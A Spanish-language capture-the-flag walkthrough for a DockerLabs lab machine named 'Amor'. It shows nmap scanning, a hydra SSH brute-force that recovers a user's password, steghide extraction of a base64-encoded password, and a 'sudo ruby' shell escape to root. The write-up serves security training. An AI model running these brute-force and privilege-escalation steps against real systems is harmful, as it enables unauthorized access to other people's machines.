# Readme Amor

## 1. Paso: Escaneo de Puertos

Realizamos un escaneo de que puertos hay abiertos con **nmap**

```bash
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
```

![alt text](image.png)

Vemos que el puerto 22 **SSH** y el puerto 80 **HTTP** estan abiertos.

Con el siguiente comando, obtendremos más información acerca de los puertos que encontramos:

```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

![alt text](image-1.png)

## Paso 2: Pagina web

Al ver que el puerto **80** esta abierto, esto nos dice que es una pagina web, pondremos la ip en el navegador para entrar a la pagina web. 

![alt text](image-2.png)

Al mirar la pagina encontramos dos usuarios: **Carlota** y **Juan**.

## Paso 3: Explotación

Utilizaremos la herramienta **hydra** sobre los usuario:

Copiamos el siguiente comando:

```bash
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10
```
(Lo haremos, tanto con carlota y para juan)

Obtendremos el siguiente resultado:

![alt text](image-4.png)

![alt text](image-3.png)

De juan no logramos obtener algo pero de carlota encontramos lo siguiente:

```bash
[22][ssh] host: 172.17.0.2   login: carlota   password: babygirl
```
Vemos que tenemos unas credenciales para entrar por un servicio **SSH**

```bash
ssh carlota@172.17.0.2
```
Ingresamos y ponemos la contraseña:

![alt text](image-5.png)

Y ya estamos adentro!!

Al movernos por los directorios vamos a encontrar una imagen.

![alt text](image-6.png)

Para verla vamos a usar el **scp**

```bash
scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/albertomarcostic/Desktop/DockerLabs/Amor/content
```
(El comando se ajustara dependiendo de como tenga el directorio)

En otra terminal ejecutaremos el comando:

![alt text](image-7.png)

Y para revisar lo que tiene dentro utilizaremos la herramienta **steghide** :

```bash
steghide --extract -sf imagen.jpg
```
Vemos que hemos extraido **"secret.txt"**

![alt text](image-8.png)

Ponemos un **cat** para que nos muestre lo que tiene adentro:

![alt text](image-9.png)

obtendremos lo que parece ser una contraseña

```bash
ZXNsYWNhc2FkZXBpbnlwb24=

```

Y con **echo** vamos a decodificar la contraseña:

```
echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 --decode
```
Obtenemos el siguiente resultado:

![alt text](image-10.png)

## Usuario Oscar

Si seguimos moviendonos por los directorios

Encontraremos que si nos movemos a **/home** y ponemos **ls** encontraremos otro usuario llamado **oscar**

![alt text](image-11.png)

Al cual procederemos a entrar ingresando la contraseña encontrada y escribiendo **bash**:

![alt text](image-12.png)

Y ya estamos como oscar.

Y ya para terminar colocamos el siguiente comando:

```bash
sudo ruby -e 'exec "/bin/sh"'
```
y colocando **bash**:

![alt text](image-13.png)

Ya somos el **superusuario** o **root** y hemos finalizado!
